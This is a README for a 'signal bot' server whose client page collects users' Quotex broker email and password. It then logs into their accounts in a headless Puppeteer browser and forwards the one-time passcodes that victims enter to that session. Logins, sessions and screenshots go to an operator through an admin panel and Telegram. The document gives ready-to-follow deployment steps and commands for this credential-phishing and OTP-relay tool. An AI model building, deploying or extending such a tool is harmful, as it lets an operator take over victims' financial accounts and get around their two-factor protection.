[README.md](https://github.com/user-attachments/files/31874321/README.md)
[README.md](https://github.com/user-attachments/files/29049838/README.md)
# Chinese Signal Bot — Server v5 (Auto-Login Edition)

## What's New in v5
- 🤖 **Quotex Auto-Login** — Puppeteer headless browser logs into Quotex automatically
- 🔄 **Auto OTP Forwarding** — Client enters OTP on main bot → instantly forwarded to live Puppeteer session
- 🖥️ **Broker Sessions Panel** — Admin panel gets a full session manager with real-time status cards
- 📸 **Live Screenshots** — See exactly what's on the Quotex screen at any moment
- 💬 **Telegram Session Control** — Submit OTP, launch/close sessions from your phone
- 📜 **Session History** — MongoDB log of all past sessions with outcome

---

## Quick Setup (Render.com)

### 1. Upload files
Upload all files from this folder to your Render service (or push to GitHub and connect).

### 2. Set Environment Variables on Render
Go to your service → Environment → Add:

| Variable | Value |
|---|---|
| `MONGODB_URI` | Your MongoDB Atlas connection string |
| `TELEGRAM_BOT_TOKEN` | Your Telegram bot token |
| `TELEGRAM_CHAT_ID` | Your Telegram chat ID |
| `AUTO_LAUNCH_ON_LOGIN` | `true` to auto-start sessions when clients submit credentials |

### 3. Build Command (on Render)
```
npm install
```
Puppeteer downloads Chromium (~170MB) on first install. This is normal.

### 4. Start Command
```
node server.js
```

---

## How Quotex Auto-Login Works

### Flow A — Admin manually launches a session:
1. Open Admin Panel → click **🤖 Auto-Login** in sidebar
2. Click **+ New Session**
3. Enter client name, Quotex email, password → click **Launch Login**
4. Server opens headless Chrome, fills credentials automatically
5. If OTP required → session card shows **🔢 Waiting OTP** + Telegram alert
6. Enter OTP in the session card OR reply via Telegram → done!

### Flow B — Fully automatic (AUTO_LAUNCH_ON_LOGIN=true):
1. Client submits email+password on the main bot
2. Server AUTOMATICALLY launches a Puppeteer session
3. Quotex sends OTP to the client's email/phone
4. Client enters OTP on the main bot page
5. Server AUTOMATICALLY forwards OTP to the open Puppeteer session
6. Login completes — you get a Telegram notification ✅
7. Zero manual work required!

---

## Telegram Commands
| Command | Action |
|---|---|
| `/menu` | Open main menu |
| `/qx` | List all Quotex sessions |
| `/qxlaunch email password name` | Start a new login session |
| `/otp SESSION_ID 123456` | Submit OTP for a session |
| `/qxclose SESSION_ID` | Close a session |
| `/online` | Show online users |
| `/stats` | Bot statistics |
| Send any username | Open quick-action menu for that user |

---

## Admin Panel — New Features
- **🤖 Auto-Login** section in sidebar (new)
- **🚀 Launch** button on every credential row in Credentials table
- Session cards with live status: Launching → Filling → Waiting OTP → Logged In
- Screenshot viewer per session
- Session history table

---

## Files
| File | Description |
|---|---|
| `server.js` | Main server (v5) |
| `admin_panel.html` | Admin dashboard (v5) |
| `main-bot.html` | Client-facing bot page |
| `package.json` | Dependencies (includes puppeteer) |
| `.env.example` | Environment variable template |

---

